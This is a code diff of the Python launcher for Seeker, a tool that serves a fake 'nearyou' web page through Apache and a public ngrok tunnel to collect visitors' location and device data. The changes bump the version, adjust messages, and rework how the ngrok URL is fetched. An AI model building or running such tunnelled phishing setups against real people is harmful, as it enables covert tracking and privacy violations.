@@ -17,7 +17,7 @@ result = '/var/www/html/nearyou/php/result.txt'
 info = '/var/www/html/nearyou/php/info.txt'
 api = 'http://localhost:4040/api/tunnels'
 site = 'nearyou'
-ver = '1.0.1'
+ver = '1.0.2'
 
 try:
 	raw_input          # Python 2
@@ -25,7 +25,7 @@ except NameError:
 	raw_input = input  # Python 3
 
 def banner():
-	os.system('tput reset')
+	os.system('clear')
 	print (C +
 	r'''                        __
   ______  ____   ____  |  | __  ____ _______
@@ -46,13 +46,13 @@ def network():
 		exit()
 
 def version():
-	print (G + '[+]' + C + ' Checking For Seeker Updates...' + W)
+	print (G + '[+]' + C + ' Checking For Seeker Updates...' + W, end='')
 	update = requests.get('https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt')
 	update = update.text.split(' ')[1]
 	update = update.strip()
 
 	if update != ver:
-		print ('\n' + G + '[!]' + C + ' A New Version is Available : ' + W + update)
+		print ('\n\n' + G + '[!]' + C + ' A New Version is Available : ' + W + update)
 		ans = raw_input('\n' + G + '[!]' + C + ' Update ? [y/n] : ' + W)
 		if ans == 'y':
 			print ('\n' + G + '[+]' + C + ' Updating...' + W + '\n')
@@ -64,24 +64,44 @@ def version():
 		else:
 			print ('\n' + R + '[-]' + C + ' Invalid Character...Skipping...'+ W)
 	else:
-		print ('\n' + G + '[+]' + C + ' Script is up-to-date...' + W)
+		print (G + ' Up-to-date' + W)
 
 def ngrok():
-	global api
-	global site
+	global api, site
 	print ('\n' + G + '[!]' + C + ' Starting Apache Server...' + W)
-	subp.check_output(['service', 'apache2', 'start'])
-	print ('\n' + G + '[!]' + C + ' Checking for Ngrok Updates...' + W + '\n')
-	subp.call(['ngrok', 'update'])
+	subp.Popen(['service', 'apache2', 'start'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
 	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
-	subp.Popen(['ngrok', 'http', '80'], stdin=subp.PIPE,stderr=subp.PIPE, stdout=subp.PIPE)
-	time.sleep(10)
-	r1 = requests.get('{}'.format(api))
-	page = r1.content
-	json1 = json.loads(page)
-	for item in json1['tunnels']:
-		if item['proto'] == 'https':
-			print ( G + '[+]' + C + ' URL : ' + W + item['public_url'] + '/' + site + '/')
+	subp.Popen(['./Ngrok/ngrok', 'http', '80'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
+	time.sleep(2)
+
+	def geturl():
+		time.sleep(2)
+		global goturl, url
+		r1 = requests.get('{}'.format(api))
+		page = r1.content
+		json1 = json.loads(page)
+		items = json1['tunnels']
+		if not items:
+			geturl()
+		else:
+			for item in json1['tunnels']:
+				if item['proto'] == 'https':
+					url = item['public_url']
+					if '.ngrok.io' in url:
+						goturl = True
+					else:
+						goturl = False
+
+	geturl()
+
+	while True:
+		time.sleep(2)
+		if goturl == True:
+			print ( G + '[+]' + C + ' URL : ' + W + url + '/' + site + '/')
+			break
+		else:
+			print (R + '[-]' + C + ' Unable to Get Ngrok URL.' + W + '\n')
+			exit()
 
 def wait():
 	printed = False
